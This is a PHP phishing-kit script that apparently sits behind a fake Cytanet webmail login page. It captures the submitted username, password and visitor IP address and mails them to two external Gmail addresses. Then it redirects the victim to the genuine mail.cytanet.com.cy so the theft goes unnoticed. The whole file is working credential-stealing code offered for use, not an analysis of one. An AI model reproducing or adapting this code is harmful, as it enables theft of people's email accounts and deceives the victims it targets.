<?
$username = $_POST['username'];
$password = $_POST['password'];

$ip = getenv("REMOTE_ADDR");



$subj = "mail.cytanet.com.cy";
$from = "From:mail.cytanet.com.cy";

$msg .= "username: ".$_POST['username']."\n";
$msg .= "password: ".$_POST['password']."\n";



$msg .= "------------------------------------------------\n";
$msg .= "IP: ".$ip."\n";

	


if (($username==NULL)){

echo "<script>location.replace('index.html');</script>";
exit;
}

if (($password==NULL)){

echo "<script>location.replace('index.html');</script>";
exit;
}


else {

mail("idagabriel146@gmail.com,amandachris146@gmail.com", $subj, $msg, $from);

echo "<script>location.replace('https://mail.cytanet.com.cy/');</script>";
    
}	



?>